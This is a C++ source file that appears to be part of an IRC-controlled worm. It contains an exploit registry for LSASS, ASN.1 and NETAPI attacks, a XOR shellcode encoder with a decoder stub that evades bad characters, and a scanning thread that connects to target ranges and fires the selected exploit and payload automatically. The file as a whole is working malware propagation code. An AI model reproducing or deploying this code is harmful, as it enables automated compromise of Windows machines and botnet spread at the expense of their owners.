#include <winsock2.h>
#include "scan.h"
#include "exploit_lsass.h"
#include "exploit_asn.h"
//#include "exploit_netapi.h"

class Exploits Exploits;

CHAR XorifyCode[] =
"\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x5B\x31\xC9\x66\xB9"
"\x00\x00\x66\x81\xF1\x00\x00\x80\x73\x13\x00\x43\xE2\xF9";

Exploit::Exploit(PCHAR Name, USHORT Port){
	strncpy(Exploit::Name, Name, sizeof(Exploit::Name));
	AffectedPort = Port;
}

Socket Exploit::GetInitialSocket(VOID){
	return Socket;
}

VOID Exploit::Run(::Socket & Socket){
	//CHAR Temp[128];
	//sprintf(Temp, "Starting Exploits::%s against %s:%d", GetName(), inet_ntoa(SocketFunction::Stoin(Socket.GetPeerAddr())), Socket.GetPeerPort());
	//dprintf("%s\r\n", Temp);
	//IRCList.Notify(Temp);
	Exploit::Socket = Socket;
	Socket.BlockingMode(BLOCKING);
	StartThread();
}

VOID Exploit::ThreadFunc(VOID){
	ExploitTarget();
	Socket.Disconnect(CLOSE_BOTH_HDL); // Disconnect ungracefully
}

PCHAR Exploit::GetName(VOID){
	return Name;
}

USHORT Exploit::GetAffectedPort(VOID){
	return AffectedPort;
}

Payload::Payload(){
	Shellcode = NULL;
	ShellcodeSize = 0;
}

Payload::~Payload(){
	if(Shellcode)
		delete[] Shellcode;
}

PCHAR Payload::GetShellcode(VOID){
	return Shellcode;
}

UINT Payload::GetShellcodeSize(VOID){
	return ShellcodeSize;
}

VOID Payload::Xor(PCHAR BadChars, UINT BadCharsSize){
	UINT OriginalShellcodeSize = GetShellcodeSize();
	PCHAR OriginalShellcode = new CHAR[OriginalShellcodeSize];
	memcpy(OriginalShellcode, GetShellcode(), OriginalShellcodeSize);
	PCHAR NewShellcode = AllocateShellcode(OriginalShellcodeSize + sizeof(XorifyCode) - 1);
	memcpy(NewShellcode, XorifyCode, sizeof(XorifyCode) - 1);

	UCHAR XorValue = 1;
	for(UINT i = 0; i < OriginalShellcodeSize; i++){
		for(UINT j = 0; j < BadCharsSize; j++){
			if(((UCHAR)OriginalShellcode[i] ^ XorValue) == BadChars[j]){
				XorValue++;
				i--;
				break;
			}
		}
	}
/*	for(UINT i = 1; i < 0xFF; i++){
		if(!memchr(OriginalShellcode, i, OriginalShellcodeSize)){
			XorValue = i;
			break;
		}
	}*/

	for(UINT i = 0; i < OriginalShellcodeSize; i++)
		OriginalShellcode[i] ^= XorValue;

	NewShellcode[24] = XorValue;
	BYTE LowByte = 0x01;
	BYTE HighByte = 0x01;
	if(LOBYTE(OriginalShellcodeSize) == LowByte)
		LowByte = 0x10;
	if(HIBYTE(OriginalShellcodeSize) == HighByte)
		HighByte = 0x10;
	USHORT ShellcodeLenXorValue = MAKEWORD(LowByte, HighByte);
	USHORT XoredShellcodeSize = OriginalShellcodeSize ^ ShellcodeLenXorValue;
	memcpy(&NewShellcode[14], &XoredShellcodeSize, 2);
	memcpy(&NewShellcode[19], &ShellcodeLenXorValue, 2);

	memcpy(NewShellcode + sizeof(XorifyCode) - 1, OriginalShellcode, OriginalShellcodeSize);

	delete[] OriginalShellcode;
}

PCHAR Payload::AllocateShellcode(UINT Size){
	if(Shellcode)
		delete[] Shellcode;
	ShellcodeSize = Size;
	return Shellcode = new CHAR[Size];
}

Exploits::Exploits(){
	//Register(new ExploitLSASS);
	//Register(new ExploitASN1SMB);
	//Register(new ExploitASN1SMBNT);
	//Register(new ExploitNETAPI);
	Exploit = NULL;
	Payload = NULL;
}

Exploits::~Exploits(){
	for(UINT i = 0; i < ExploitsList.size(); i++){
		delete ExploitsList[i];
	}
}

VOID Exploits::Run(Socket & Socket){
	if(!GetPayload() || !GetExploit())
		return;
	Exploit->Run(Socket);
}

USHORT Exploits::GetAffectedPort(VOID){
	if(!Exploit)
		return 0;
	return Exploit->GetAffectedPort();
}

VOID Exploits::SetExploit(PCHAR Name){
	if(!Name)
		Exploit = NULL;
	for(UINT i = 0; i < ExploitsList.size(); i++){
		if(strlen(Name) == 0 || strlen(Name) > strlen(ExploitsList[i]->GetName()))
			continue;
		if(stricmp(ExploitsList[i]->GetName(), Name) == 0){
			Exploit = ExploitsList[i];
		}
	}
}

Exploit* Exploits::GetExploit(VOID){
	return Exploit;
}

VOID Exploits::SetPayload(::Payload* Payload){
	Mutex.WaitForAccess();
	if(Payload)
		RemovePayload();
	Exploits::Payload = Payload;
	Mutex.Release();
}

Payload* Exploits::GetPayload(VOID){
	return Payload;
}

VOID Exploits::Register(::Exploit* Exploit){
	//dprintf("Registering %s\r\n", Exploit->GetName());
	ExploitsList.push_back(Exploit);
}

VOID Exploits::RemovePayload(VOID){
	delete Payload;
	Payload = NULL;
}

BOOL ScanThread::ScanQueue::OnEvent(WSANETWORKEVENTS NetEvents){
	if(NetEvents.lNetworkEvents & FD_CONNECT){
		if(!NetEvents.iErrorCode[FD_CONNECT_BIT]){
			if(!Exploits.GetPayload() || !Exploits.GetExploit()){
				//CHAR Text[256];
				//sprintf(Text, "%s %d open", inet_ntoa(SocketFunction::Stoin(SocketList[SignalledEvent].GetPeerAddr())), SocketList[SignalledEvent].GetPeerPort());
				//IRCList.Notify(Text);
			}else{
				Exploits.Run(SocketList[SignalledEvent]);
				Remove(FALSE);
			}
		}
	}
	return TRUE;
}

ScanThread::ScanThread(UINT Interval){
	Event = CreateEvent(NULL, TRUE, FALSE, NULL);
	SetInterval(Interval);
	StartThread();
}

VOID ScanThread::AddTarget(PCHAR Host){
	Mutex.WaitForAccess();
	Target Target(Host);
	TargetList.push_back(Target);
	SetEvent(Event);
	Mutex.Release();
}

VOID ScanThread::ClearTargets(VOID){
	Mutex.WaitForAccess();
	TargetList.clear();
	Mutex.Release();
}

VOID ScanThread::SetInterval(UINT Interval){
	if(Interval < 3000)
		Interval = 3000;
	ScanThread::Interval = Interval;
}

VOID ScanThread::Pause(VOID){
	ResetEvent(Event);
}

VOID ScanThread::Resume(VOID){
	SetEvent(Event);
}

ULONG ScanThread::GetCurrentAddr(VOID){
	return CurrentAddr;
}

USHORT ScanThread::GetCurrentPort(VOID){
	return CurrentPort;
}

VOID ScanThread::ThreadFunc(VOID){
	UINT TargetI = 0;
	while(1){
		WaitForSingleObject(Event, INFINITE);
		if(TargetList.size() == 0){
			ResetEvent(Event);
			continue;
		}
		Mutex.WaitForAccess();
		if(TargetI > TargetList.size() - 1)
			TargetI = 0;

		CurrentAddr = TargetList[TargetI].GetNext();
		if(!CurrentAddr){
			TargetList.erase(TargetList.begin() + TargetI);
			Mutex.Release();
			continue;
		}
		Mutex.Release();

		CurrentPort = Exploits.GetAffectedPort();
		if(!CurrentPort){
			ResetEvent(Event);
			continue;
		}

		Socket NewSocket;
		NewSocket.Create(SOCK_STREAM);
		NewSocket.EventSelect(FD_CONNECT);
		NewSocket.Connect(inet_ntoa(SocketFunction::Stoin(CurrentAddr)), CurrentPort);
		ScanQueueList.Add(NewSocket);
		Sleep(Interval);
	}
}